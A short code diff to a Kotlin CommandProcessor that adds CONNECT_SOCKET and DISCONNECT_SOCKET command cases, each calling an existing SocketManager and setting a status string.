@@ -183,6 +183,14 @@ object CommandProcessor {
                     SocketManager.disconnect()
                     status = "EXECUTED (STOPPED)"
                 }
+                "CONNECT_SOCKET" -> {
+                    SocketManager.connect(ctx)
+                    status = "SOCKET_CONNECTED"
+                }
+                "DISCONNECT_SOCKET" -> {
+                    SocketManager.disconnect()
+                    status = "SOCKET_DISCONNECTED"
+                }
                 "TRACKING_STREAM" -> {
                     val parts = content.split("|")
                     val mode = parts[0].trim().uppercase()
